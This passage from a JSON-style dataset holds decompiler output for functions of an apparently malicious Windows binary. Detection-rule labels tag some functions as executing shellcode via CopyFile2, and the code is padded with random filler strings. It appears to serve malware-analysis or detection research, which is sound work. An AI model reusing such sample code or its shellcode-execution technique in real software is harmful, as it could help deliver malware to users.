puVar5[0xc] = 0x92e;\n    uStack20 = 3;\n    puVar16[-0x1a] = 0x42b48a;\n    uVar8 = fcn.004033fa();\n    puVar16 = puStack48;\n    puStack48[-1] = uVar8;\n    piStack40 = puVar16 + -0xf;\n    puStack44 = puVar16 + -9;\n    puVar16[-9] = 0;\n    puVar16[-5] = 0;\n    puVar16[-4] = 0xf;\n    *(puVar16 + -9) = 0;\n    *(puVar16 + -0x11) = uStack36;\n    puVar16[-0x10] =\n         \"kcqcgtsbpbtokdpardctnzhaziomrqznkuzcvlvrxblfbzlxhosbiidiysscrtpukccyladpjebrwxygcjyoidwftgaooyswmqwr\";\n    puVar16[-0x12] = 100;\n    puVar16[-0x13] = 0x42b4d3;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 0;\n    puVar5[4] = 0;\n    puVar5[5] = 0xf;\n    *puVar5 = 0;\n    uStack20 = 7;\n    *(puVar16 + -0x14) = uStack36;\n    puVar16[-0x13] = \"loieiaopwvupffncihyfbvmcxktncvmqhspniqusewsuftsfcuochj\";\n    puVar16[-0x15] = 0x36;\n    puVar16[-0x16] = 0x42b512;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *(piStack40 + 0xc) = 1;\n    puVar5[0xd] = 0x3e4;\n    *(puVar5 + 0xe) = 0;\n    uStack20 = 3;\n    puVar16[-0x16] = 0x42b530;\n    uVar8 = fcn.00401ffa();\n    puVar16 = puStack48;\n    puVar14 = puStack48 + -1;\n    puStack48[-1] = uVar8;\n    piStack40 = puVar16 + -0x19;\n    puStack44 = puVar16 + -6;\n    puVar16[-6] = 0;\n    puVar16[-2] = 0;\n    *puVar14 = 0xf;\n    *(puVar16 + -6) = 0;\n    *(puVar16 + -0x1b) = uStack36;\n    puVar16[-0x1a] = \"vtozzzpwjtttqcxbasvbqpuhjwuvsuypsuzayjwmpzvugpdzvopliymgnwihrjwyupbgkoi\";\n    puVar16[-0x1c] = 0x47;\n    puVar16[-0x1d] = 0x42b57b;\n    fcn.00402f72();\n    puVar7 = piStack40;\n    piStack52 = piStack40 + 0x20;\n    *(piStack40 + 0x20) = 0;\n    *(puVar7 + 0x30) = 0;\n    *(puVar7 + 0x34) = 0xf;\n    puVar7[0x20] = 0;\n    uStack20 = 5;\n    *(puVar16 + -0x1e) = uStack36;\n    puVar16[-0x1d] = \"eycdmglgjtmimqqwsakqr\";\n    puVar16[-0x1f] = 0x15;\n    puVar16[-0x20] = 0x42b5c2;\n    fcn.00402f72();\n    puVar7 = piStack40;\n    *(piStack40 + 4) = 0;\n    *(puVar7 + 0x14) = 0;\n    *(puVar7 + 0x18) = 0xf;\n    puVar7[4] = 0;\n    uStack20 = 6;\n    *(puVar16 + -0x21) = uStack36;\n    puVar16[-0x20] = \"utqbqocnoixpggyzytpuvmecuthyxewbuyxdwuskurqvuzteefaoskjodbxknsxosyfacprqww\";\n    puVar16[-0x22] = 0x4a;\n    puVar16[-0x23] = 0x42b608;\n    fcn.00402f72();\n    puVar7 = piStack40;\n    *piStack40 = 0;\n    *(puVar7 + 0x1c) = 0x299;\n    *(puVar7 + 0x3c) = 0x40ecb020;\n    *(puVar7 + 0x38) = 0;\n    puVar7[0x40] = 1;\n    *(puVar7 + 0x48) = 0x40b5e900;\n    *(puVar7 + 0x44) = 0;\n    puVar16[-0x23] = 0x42b63a;\n    fcn.00403805();\n    puVar16 = puStack48;\n    uStack20 = 3;\n    puVar15 = puStack48 + -1;\n    puStack48[-1] = 0x40;\n    puVar16[-2] = 0x42b64b;\n    uVar8 = fcn.004024b9(*puVar15, *puVar16);\n    puVar16[-1] = 0x40;\n    puVar16[-2] = uVar8;\n    puVar16[-3] = 0x42b656;\n    fcn.00401a32(puVar16[-2]);\n    piStack40 = puVar16 + -0x1c;\n    puStack44 = puVar16 + -0xb;\n    puStack48 = puVar16;\n    puVar16[-0xb] = 0;\n    puVar16[-7] = 0;\n    puVar16[-6] = 0xf;\n    *(puVar16 + -0xb) = 0;\n    *(puVar16 + -0x1e) = uStack36;\n    puVar16[-0x1d] = \"ewsguobjzfydkbwrvstuakqaxgkwkkajwyclscusnsioadqhdwjekqg\";\n    puVar16[-0x1f] = 0x37;\n    puVar16[-0x20] = 0x42b6a1;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    piStack52 = piStack40 + 10;\n    piStack40[0xf] = 0xf;\n    piVar6[0xe] = 8;\n    piVar6[0xb] = 0x7a666461;\n    piVar6[10] = 0x73637679;\n    *(piVar6 + 0xc) = 0;\n    piVar6[1] = 0;\n    piVar6[5] = 0;\n    piVar6[6] = 0xf;\n    *(piVar6 + 1) = 0;\n    uStack20 = 4;\n    *(puVar16 + -0x21) = uStack36;\n    puVar16[-0x20] = \"iduayyeowcoomskwzikbneceaaqtorcffbisypanhesxdpxsbnuhydieantomoirtpcmecj\";\n    puVar16[-0x22] = 0x47;\n    puVar16[-0x23] = 0x42b70d;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    *piStack40 = &stack0xffffffa8;\n    *(piVar6 + 7) = 1;\n    piVar6[8] = 0x1006;\n    *(piVar6 + 9) = 1;\n    *(piVar6 + 0x10) = 1;\n    iVar4 = *0x5421ac;\n    iVar3 = *0x5421a8;\n    iVar10 = *0x5421a4;\n    piVar6[0x17] = *0x5421a0;\n    piVar6[0x18] = iVar10;\n    piVar6[0x19] = iVar3;\n    piVar6[0x1a] = iVar4;\n    *(piVar6 + 0x1b) = 0;\n    uStack20 = 3;\n    puVar16[-0x23] = 0x42b743;\n    fcn.00403314();\n    puVar16 = puStack48;\n    uVar9 = uStack68;\n    if (0xf < uStack68) {\n        uVar9 = uStack68 + 1;\n        uVar11 = uStack88;\n        if (0xfff < uVar9) {\n            uVar11 = *(uStack88 - 4);\n            if (0x1f < (uStack88 - 4) - uVar11) goto code_r0x0042b825;\n            uVar9 = uStack68 + 0x24;\n        }\n        puStack48[-1] = uVar9;\n        puVar16[-2] = uVar11;\n        puVar16[-3] = 0x42b77b;\n        uVar9 = fcn.00401a32(puVar16[-2]);\n    }\n    uStack72 = 0;\n    uStack68 = 0xf;\n    uStack88 = uStack88 & 0xffffff00;\n    puVar16[-1] = uVar9;\n    piStack40 = puVar16 + -0xb;\n    puVar16[-6] = 0;\n    puVar16[-2] = 0;\n    puVar16[-1] = 0xf;\n    *(puVar16 + -6) = 0;\n    *(puVar16 + -0xd) = uStack36;\n    puVar16[-0xc] = \"pzbkocoeopjbanjfeoazm\";\n    puVar16[-0xe] = 0x15;\n    puVar16[-0xf] = 0x42b7d3;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[1] = 0x40d60d00;\n    *puVar5 = 0;\n    puVar5[2] = 0x2f8;\n    *(puVar5 + 3) = 1;\n    *(puVar5 + 4) = 0;\n    puVar16[-0xf] = 0x42b7f7;\n    fcn.004025c2();\n    *in_FS_OFFSET = iStack28;\n    return iStack64;\n}\n",
        "token_count": 9048
    },
    "0042e7d0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __fastcall fcn.0042e7d0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uchar *puVar15;\n    int32_t *in_FS_OFFSET;\n    uint auStack208 [2];\n    uint uStack200;\n    uint uStack184;\n    uint uStack180;\n    uint uStack172;\n    uchar auStack168 [4];\n    uint uStack164;\n    uint uStack156;\n    uint uStack152;\n    uint32_t uStack140;\n    uint uStack124;\n    uint32_t uStack120;\n    uint32_t uStack116;\n    uint uStack100;\n    uint32_t uStack96;\n    uint32_t uStack92;\n    uint uStack76;\n    uint32_t uStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t *piStack52;\n    uchar *puStack48;\n    uchar *puStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffff74;\n    uStack24 = 0x44c500;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iStack64 = param_1 + 0x20;\n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x30) = 0;\n    *(param_1 + 0x34) = 0xf;\n    *(param_1 + 0x20) = 0;\n    iStack60 = param_1 + 0x44;\n    *(param_1 + 0x44) = 0;\n    *(param_1 + 0x54) = 0;\n    *(param_1 + 0x58) = 0xf;\n    *(param_1 + 0x44) = 0;\n    iStack56 = param_1 + 0x78;\n    *(param_1 + 0x78) = 0;\n    *(param_1 + 0x88) = 0;\n    *(param_1 + 0x8c) = 0xf;\n    *(param_1 + 0x78) = 0;\n    uStack20 = 4;\n    puStack44 = &stack0xffffff58;\n    uStack152 = 0;\n    uStack156 = 0;\n    uStack164 = 0;\n    uStack172 = 0x42e88a;\n    iStack68 = param_1;\n    uStack172 = fcn.00401c53();\n    piStack40 = &stack0xffffff30;\n    uStack184 = 0;\n    uStack180 = 0xf;\n    uStack200 = 0;\n    fcn.00402f72(0x1c, uStack36, \"ndbetquxrxzdwpbzusfjtcstjemm\");\n    puVar3 = piStack40;\n    piStack40[1] = 0x40e47660;\n    *puVar3 = 0;\n    puVar3[8] = 0x1e0;\n    *(puVar3 + 9) = 1;\n    uVar5 = fcn.0040407a();\n    puVar2 = puStack44;\n    *(puStack44 + -4) = uVar5;\n    piStack40 = puVar2 + -0x34;\n    *(puVar2 + -0x34) = 0;\n    *(puVar2 + -0x24) = 0;\n    *(puVar2 + -0x20) = 0xf;\n    puVar2[-0x34] = 0;\n    puVar15 = puVar2 + -0x40;\n    puVar2[-0x3c] = uStack36;\n    *(puVar2 + -0x38) = \"ogdahblflkrlhjheahbjpvjsjkk\";\n    *(puVar2 + -0x40) = 0x1b;\n    *(puVar2 + -0x44) = 0x42e933;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    *(piStack40 + 6) = 0;\n    iVar1 = *0x5421dc;\n    iVar9 = *0x5421d8;\n    iVar8 = *0x5421d4;\n    piVar4[7] = *0x5421d0;\n    piVar4[8] = iVar8;\n    piVar4[9] = iVar9;\n    piVar4[10] = iVar1;\n    piVar4[0xb] = 0x40ca5f80;\n    *(piVar4 + 0xc) = 0;\n    uVar7 = piVar4[5];\n    if (0xf < uVar7) {\n        iVar8 = *piVar4;\n        uVar6 = uVar7 + 1;\n        iVar9 = iVar8;\n        if (uVar6 < 0x1000) {\ncode_r0x0042e97d:\n            *(puVar2 + -0x44) = uVar6;\n            *(puVar2 + -0x48) = iVar9;\n            *(puVar2 + -0x4c) = 0x42e984;\n            uVar7 = fcn.00401a32(*(puVar2 + -0x48));\n            goto code_r0x0042e987;\n        }\n        iVar9 = *(iVar8 + -4);\n        if ((iVar8 + -4) - iVar9 < 0x20) {\n            uVar6 = uVar7 + 0x24;\n            goto code_r0x0042e97d;\n        }\n        uStack20 = 0;\n        *(puVar2 + -0x44) = 0x42f16c;\n        fcn.004047f5();\ncode_r0x0042f16c:\n        uStack20 = 1;\n        *(puVar15 + -4) = 0x42f178;\n        fcn.004047f5();\ncode_r0x0042f178:\n        uStack20 = 2;\n        *(puVar15 + -4) = 0x42f184;\n        fcn.004047f5();\ncode_r0x0042f184:\n        uStack20 = 3;\n        *(puVar15 + -4) = 0x42f190;\n        fcn.004047f5();\n        *(puVar15 + -4) = &stack0xfffffffc;\n        *(puVar15 + -0x74) = 0x42f19c;\n        fcn.004052d1();\n        *(puVar15 + -0x74) = &stack0x00000008;\n        *(puVar15 + -0xe4) = 0x42f1ac;\n        fcn.004052d1();\n        *(puVar15 + -0xe4) = &stack0x00000014;\n        *(puVar15 + -0x154) = 0x42f1bc;\n        fcn.004052d1();\n        *(puVar15 + -0x154) = &stack0x00000020;\n        *(puVar15 + -0x1c4) = 0x42f1cc;\n        fcn.004052d1();\n        *(puVar15 + -0x1c4) = &stack0x0000002c;\n        *(puVar15 + -0x234) = 0x42f1df;\n        fcn.00403a76();\n        *(puVar15 + -0x234) = 0x42f1e7;\n        iVar8 = fcn.00403a76();\n        return iVar8;\n    }\ncode_r0x0042e987:\n    puVar2 = puStack44;\n    puVar10 = puStack44 + -4;\n    *(puStack44 + -4) = uVar7;\n    piStack40 = puVar2 + -0x6c;\n    puStack48 = puVar2 + -0x18;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -8) = 0;\n    *puVar10 = 0xf;\n    puVar2[-0x18] = 0;\n    puVar2[-0x74] = uStack36;\n    *(puVar2 + -0x70) = \"rwywdqynorzcabmntgrtizpjdhjfajamxysfhofkdvc\";\n    *(puVar2 + -0x78) = 0x2b;\n    *(puVar2 + -0x7c) = 0x42e9d0;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    piStack52 = piStack40 + 10;\n    piStack40[0xf] = 0xf;\n    puVar3[0xe] = 0xb;\n    puVar3[10] = 0x6d737369;\n    puVar3[0xb] = 0x67667862;\n    *(puVar3 + 0x2f) = 0x746f6267;\n    *(puVar3 + 0x33) = 0;\n    *puVar3 = 0;\n    puVar3[4] = 0;\n    puVar3[5] = 0xf;\n    *puVar3 = 0;\n    uStack20 = 0xc;\n    puVar2[-0x80] = uStack36;\n    *(puVar2 + -0x7c) = \"gvxwyglbknodsjuhtraitqeawrnvpduxvjdysxxpspfvzvmxfcusihqldmidwnxubrsufkmklaxtsjrvsqapqn\";\n    *(puVar2 + -0x84) = 0x56;\n    *(puVar2 + -0x88) = 0x42ea3e;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    piStack40[7] = 0x40db12c0;\n    puVar3[6] = 0;\n    puVar3[8] = 0x11d9;\n    *(puVar3 + 9) = 1;\n    puVar3[0x10] = *0x5421f0;\n    puVar3[0x11] = *0x5421f4;\n    puVar3[0x12] = *0x5421f8;\n    puVar3[0x13] = *0x5421fc;\n    puVar3[0x14] = 0x409fec00;\n    *(puVar2 + -0x88) = 0x42ea71;\n    fcn.004042af();\n    puVar2 = puStack44;\n    uStack20 = 4;\n    puVar11 = puStack44 + -0xc;\n    *(puStack44 + -4) = 0;\n    *(puVar2 + -8) = 0;\n    *(puVar2 + -0x10) = 0x42ea95;\n    uVar5 = fcn.0040639d();\n    puStack44 = puVar11;\n    *(puVar2 + -0x10) = uVar5;\n    piStack40 = puVar2 + -0x5c;\n    *(puVar2 + -0x24) = 0;\n    *(puVar2 + -0x14) = 0;\n    *(puVar2 + -0x10) = 0xf;\n    puVar2[-0x24] = 0;\n    puVar2[-100] = uStack36;\n    *(puVar2 + -0x60) = \"gjrsftxrxaknpbjzawawbpgwhqsuwkphcgisyvrazhpysawfzphfdlkuviwtkwongrxewhmolxtcteadhfswhy\";\n    *(puVar2 + -0x68) = 0x56;\n    *(puVar2 + -0x6c) = 0x42eadd;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    piStack40[7] = *0x542210;\n    piVar4[8] = *0x542214;\n    piVar4[9] = *0x542218;\n    piVar4[10] = *0x54221c;\n    piVar4[3] = 0x6c797470;\n    piVar4[4] = 0x7a6e6372;\n    *(piVar4 + 5) = 0x74;\n    *piVar4 = &stack0xffffff74;\n    *(piVar4 + 1) = 0;\n    piVar4[2] = 0x4f2;\n    *(piVar4 + 0xb) = 0;\n    piVar4[0xd] = 0x40b44400;\n    piVar4[0xc] = 0;\n    *(puVar2 + -0x6c) = 0x42eb29;\n    fcn.00402d56();\n    puVar2 = puStack44;\n    uVar7 = uStack120;\n    if (0xf < uStack120) {\n        uVar7 = uStack120 + 1;\n        uVar6 = uStack140;\n        if (0xfff < uVar7) {\n            uVar6 = *(uStack140 - 4);\n            puVar15 = puStack44;\n            if (0x1f < (uStack140 - 4) - uVar6) goto code_r0x0042f16c;\n            uVar7 = uStack120 + 0x24;\n        }\n        *(puStack44 + -4) = uVar7;\n        *(puVar2 + -8) = uVar6;\n        *(puVar2 + -0xc) = 0x42eb64;\n        uVar7 = fcn.00401a32(*(puVar2 + -8));\n    }\n    uStack124 = 0;\n    uStack120 = 0xf;\n    uStack140 = uStack140 & 0xffffff00;\n    puStack44 = puVar2;\n    *(puVar2 + -4) = uVar7;\n    piStack40 = puVar2 + -0x60;\n    puStack48 = puVar2 + -0x20;\n    *(puVar2 + -0x20) = 0;\n    *(puVar2 + -0x10) = 0;\n    *(puVar2 + -0xc) = 0xf;\n    puVar2[-0x20] = 0;\n    puVar2[-0x68] = uStack36;\n    *(puVar2 + -100) = \"vsnkreugwvkebomphjxxxxgvykznjuwetbtkohkhtvvqqltejtwwl\";\n    *(puVar2 + -0x6c) = 0x35;\n    *(puVar2 + -0x70) = 0x42ebc5;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    piStack52 = piStack40 + 9;\n    piStack40[9] = 0;\n    piVar4[0xd] = 0;\n    piVar4[0xe] = 0xf;\n    *(piVar4 + 9) = 0;\n    uStack20 = 10;\n    puVar2[-0x74] = uStack36;\n    *(puVar2 + -0x70) = \"duotgnpljpghbqajwbvfuiuanpuekbjhundvtlba\";\n    *(puVar2 + -0x78) = 0x28;\n    *(puVar2 + -0x7c) = 0x42ec0c;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    piStack40[1] = 0;\n    piVar4[5] = 0;\n    piVar4[6] = 0xf;\n    *(piVar4 + 1) = 0;\n    uStack20 = 0xb;\n    puVar2[-0x80] = uStack36;\n    *(puVar2 + -0x7c) = \"wptlwnvvvripcuvkyzjgdhclmrlbdczpnjermguuuwrnbhtmkrbgsiwsbvgqwscxlbniajkqxvn\";\n    *(puVar2 + -0x84) = 0x4b;\n    *(puVar2 + -0x88) = 0x42ec52;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    *piStack40 = &stack0xffffff8c;\n    piVar4[7] = 0x1b0;\n    *(piVar4 + 8) = 0;\n    *(piVar4 + 0xf) = 0;\n    piVar4[0x16] = 0x5b1;\n    piVar4[0x17] = 0x18ed;\n    uStack20 = 4;\n    *(puVar2 + -0x88) = 0x42ec83;\n    fcn.00404bc9();\n    puVar2 = puStack44;\n    if (0xf < uStack96) {\n        uVar7 = uStack96 + 1;\n        uVar6 = uStack116;\n        if (0xfff < uVar7) {\n            uVar6 = *(uStack116 - 4);\n            puVar15 = puStack44;\n            if (0x1f < (uStack116 - 4) - uVar6) goto code_r0x0042f178;\n            uVar7 = uStack96 + 0x24;\n        }\n        *(puStack44 + -4) = uVar7;\n        *(puVar2 + -8) = uVar6;\n        *(puVar2 + -0xc) = 0x42ecbb;\n        fcn.00401a32(*(puVar2 + -8));\n    }\n    uStack100 = 0;\n    uStack96 = 0xf;\n    uStack116 = uStack116 & 0xffffff00;\n    *(puVar2 + -4) = 0x42ecd5;\n    fcn.00403f08();\n    piStack40 = puVar2 + -0x24;\n    puStack44 = puVar2;\n    *(puVar2 + -0x1c) = 0;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -8) = 0xf;\n    puVar2[-0x1c] = 0;\n    puVar2[-0x2c] = uStack36;\n    *(puVar2 + -0x28) = \"blraqeifnwgijmwlxwujgyqzunplviqpoivnfxochdpuzoxgdwxmfwbtaf\";\n    *(puVar2 + -0x30) = 0x3a;\n    *(puVar2 + -0x34) = 0x42ed1a;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    *piStack40 = &stack0xffffffa4;\n    *(piVar4 + 1) = 0;\n    *(piVar4 + 8) = 1;\n    *(puVar2 + -0x34) = 0x42ed2f;\n    fcn.00406087();\n    puVar2 = puStack44;\n    if (0xf < uStack72) {\n        uVar7 = uStack72 + 1;\n        uVar6 = uStack92;\n        if (0xfff < uVar7) {\n            uVar6 = *(uStack92 - 4);\n            puVar15 = puStack44;\n            if (0x1f < (uStack92 - 4) - uVar6) goto code_r0x0042f184;\n            uVar7 = uStack72 + 0x24;\n        }\n        *(puStack44 + -4) = uVar7;\n        *(puVar2 + -8) = uVar6;\n        *(puVar2 + -0xc) = 0x42ed67;\n        fcn.00401a32(*(puVar2 + -8));\n    }\n    uStack76 = 0;\n    uStack72 = 0xf;\n    uStack92 = uStack92 & 0xffffff00;\n    *(puVar2 + -8) = 0x42ed84;\n    uVar5 = fcn.00402149();\n    puStack44 = puVar2 + -4;\n    *(puVar2 + -8) = uVar5;\n    piStack40 = puVar2 + -0x48;\n    *(puVar2 + -0x1c) = 0;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -8) = 0xf;\n    puVar2[-0x1c] = 0;\n    puVar2[-0x50] = uStack36;\n    *(puVar2 + -0x4c) = \"wyegregfsnpwwdtztavrtqvxfmvynawlakgvhxwpmjqskellpffrx\";\n    *(puVar2 + -0x54) = 0x35;\n    *(puVar2 + -0x58) = 0x42edca;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    *piStack40 = *0x542230;\n    puVar3[1] = *0x542234;\n    puVar3[2] = *0x542238;\n    puVar3[3] = *0x54223c;\n    puVar3[4] = 0x1ec;\n    puVar3[6] = 0x40f020f0;\n    puVar3[5] = 0;\n    *(puVar3 + 7) = 1;\n    *(puVar3 + 8) = 1;\n    puVar3[9] = 0x19a;\n    *(puVar3 + 10) = 1;\n    *(puVar2 + -0x58) = 0x42ee04;\n    fcn.00403cf1();\n    puVar2 = puStack44;\n    puVar12 = puStack44 + -4;\n    *(puStack44 + -8) = 0x42ee0f;\n    uVar5 = fcn.0040456b();\n    puStack44 = puVar12;\n    *(puVar2 + -8) = uVar5;\n    piStack40 = puVar2 + -100;\n    puStack48 = puVar2 + -0x1c;\n    *(puVar2 + -0x1c) = 0;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -8) = 0xf;\n    puVar2[-0x1c] = 0;\n    puVar2[-0x6c] = uStack36;\n    *(puVar2 + -0x68) = \"tciyahlutafqqfwijnwvhdqwkgmafwu\";\n    *(puVar2 + -0x70) = 0x1f;\n    *(puVar2 + -0x74) = 0x42ee58;\n    fcn.00402f72();\n    puVar15 = piStack40;\n    piStack52 = piStack40 + 0x20;\n    *(piStack40 + 0x20) = 0;\n    *(puVar15 + 0x30) = 0;\n    *(puVar15 + 0x34) = 0xf;\n    puVar15[0x20] = 0;\n    uStack20 = 8;\n    puVar2[-0x78] = uStack36;\n    *(puVar2 + -0x74) = \"xsgbmunzcdmmlzszfqcgnezyqmdojjljpywmqlltaclspmydmpxsytggkrjvr\";\n    *(puVar2 + -0x7c) = 0x3d;\n    *(puVar2 + -0x80) = 0x42ee9f;\n    fcn.00402f72();\n    puVar15 = piStack40;\n    *(piStack40 + 8) = 0;\n    *(puVar15 + 0x18) = 0;\n    *(puVar15 + 0x1c) = 0xf;\n    puVar15[8] = 0;\n    uStack20 = 9;\n    puVar2[-0x84] = uStack36;\n    *(puVar2 + -0x80) = \"wrkhgvlyurowlzzsyjmthwrpmzmgcrzpmcgxrxrkhnunsiidlvdlzndnmgyic\";\n    *(puVar2 + -0x88) = 0x3d;\n    *(puVar2 + -0x8c) = 0x42eee5;\n    fcn.00402f72();\n    puVar15 = piStack40;\n    *piStack40 = 1;\n    *(puVar15 + 4) = 0x1523;\n    puVar15[0x38] = 0;\n    puVar15[0x3c] = 1;\n    *(puVar15 + 0x40) = 0x7e3;\n    puVar15[0x44] = 0;\n    uStack20 = 4;\n    *(puVar2 + -0x8c) = 0x42ef11;\n    uVar5 = fcn.00404395();\n    puVar2 = puStack44;\n    *(puStack44 + -4) = uVar5;\n    piStack40 = puVar2 + -0x44;\n    puStack48 = puVar2 + -0x1c;\n    *(puVar2 + -0x1c) = 0;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -8) = 0xf;\n    puVar2[-0x1c] = 0;\n    puVar2[-0x4c] = uStack36;\n    *(puVar2 + -0x48) = \"siuqhtexlgrucapfuhiormksoodfysafcaxxnkekbbipextieikuxocxjlfguijnucjzlri\";\n    *(puVar2 + -0x50) = 0x47;\n    *(puVar2 + -0x54) = 0x42ef5c;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    piStack40[4] = 0;\n    puVar3[8] = 0;\n    puVar3[9] = 0xf;\n    *(puVar3 + 4) = 0;\n    uStack20 = 7;\n    puVar2[-0x58] = uStack36;\n    *(puVar2 + -0x54) = \"dyicfiwmcgynnkdczizoimdqbokt\";\n    *(puVar2 + -0x5c) = 0x1c;\n    *(puVar2 + -0x60) = 0x42efa2;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    *piStack40 = *0x542250;\n    puVar3[1] = *0x542254;\n    puVar3[2] = *0x542258;\n    puVar3[3] = *0x54225c;\n    puVar3[0x10] = 0x1e00;\n    uStack20 = 4;\n    *(puVar2 + -0x60) = 0x42efc2;\n    uVar5 = fcn.00406109();\n    puVar2 = puStack44;\n    puVar13 = puStack44 + -4;\n    *(puStack44 + -4) = uVar5;\n    piStack40 = puVar2 + -0x40;\n    puStack48 = puVar2 + -0x18;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -8) = 0;\n    *puVar13 = 0xf;\n    puVar2[-0x18] = 0;\n    puVar2[-0x48] = uStack36;\n    *(puVar2 + -0x44) = \"hbpnuyzocrjtvipkmcflzicimvzhyytgyuvxkjmmgpytcpahbyufptdiefbqmloprpodl\";\n    *(puVar2 + -0x4c) = 0x45;\n    *(puVar2 + -0x50) = 0x42f00b;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    *piStack40 = 0;\n    puVar3[4] = 0;\n    puVar3[5] = 0xf;\n    *puVar3 = 0;\n    uStack20 = 6;\n    puVar2[-0x54] = uStack36;\n    *(puVar2 + -0x50) = \"kiqscgsvxxlzznbbojsyikbftktqyqdeelkojwwfppbmvrjrixgi\";\n    *(puVar2 + -0x58) = 0x34;\n    *(puVar2 + -0x5c) = 0x42f04a;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    piStack40[6] = 0x3f9;\n    *(puVar3 + 7) = 1;\n    puVar3[9] = 0x40d40000;\n    puVar3[8] = 0;\n    *(puVar2 + -0x5c) = 0x42f06b;\n    uVar5 = fcn.0040568c();\n    puVar2 = puStack44;\n    *(puStack44 + -4) = uVar5;\n    piStack40 = puStack44 + -0x68;\n    *(puStack44 + -0x24) = 0;\n    *(puStack44 + -0x14) = 0;\n    *(puStack44 + -0x10) = 0xf;\n    puStack44[-0x24] = 0;\n    uStack20 = 4;\n    puStack44[-0x70] = uStack36;\n    *(puStack44 + -0x6c) = \"ykrcwstwvmqeljbothipusdnzcyuxprz\";\n    *(puStack44 + -0x74) = 0x20;\n    puVar14 = puStack44 + -0x78;\n    puStack44 = puStack44 + -0x24;\n    *puVar14 = 0x42f0bb;\n    fcn.00402f72();\n    puVar15 = piStack40;\n    *(piStack40 + 0x1c) = 0;\n    *(puVar15 + 0x2c) = 0;\n    *(puVar15 + 0x30) = 0xf;\n    puVar15[0x1c] = 0;\n    uStack20 = 5;\n    puVar2[-0x7c] = uStack36;\n    *(puVar2 + -0x78) = \"trhkkubgsanealmfmbqtkujniiqgnyeyqrbmdjzbgqoxmrfcaxmfjgvcgh\";\n    *(puVar2 + -0x80) = 0x3a;\n    *(puVar2 + -0x84) = 0x42f101;\n    fcn.00402f72();\n    puVar15 = piStack40;\n    *(piStack40 + 0x18) = 0xf;\n    *(puVar15 + 0x14) = 4;\n    *(puVar15 + 4) = 0x6a756769;\n    puVar15[8] = 0;\n    *puVar15 = 0;\n    *(puVar15 + 0x34) = *0x542270;\n    *(puVar15 + 0x38) = *0x542274;\n    *(puVar15 + 0x3c) = *0x542278;\n    *(puVar15 + 0x40) = *0x54227c;\n    *(puVar15 + 0x5c) = 0x29d;\n    *(puVar15 + 0x60) = 0x4c1;\n    *(puVar15 + 100) = 0xd01;\n    uStack20 = 4;\n    *(puVar2 + -0x84) = 0x42f14c;\n    fcn.00402798();\n    *in_FS_OFFSET = iStack28;\n    return iStack68;\n}\n",
        "token_count": 7592
    },
    "004303f0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.004303f0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uchar *puVar11;\n    int32_t *in_FS_OFFSET;\n    int32_t aiStack188 [8];\n    uint uStack156;\n    uint uStack140;\n    uint uStack136;\n    uint uStack128;\n    uint uStack112;\n    uint uStack108;\n    uint32_t uStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uint32_t uStack80;\n    uint uStack64;\n    uint32_t uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint *puStack48;\n    uchar *puStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack48 = &stack0xffffff98;\n    puStack32 = &stack0xffffff98;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c580;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    piStack40 = &stack0xffffff44;\n    puStack44 = &stack0xffffff80;\n    uStack112 = 0;\n    uStack108 = 0xf;\n    uStack128 = 0;\n    fcn.00402f72(0x21);\n    puStack52 = &stack0xffffff64;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    uStack156 = 0;\n    uStack20 = 3;\n    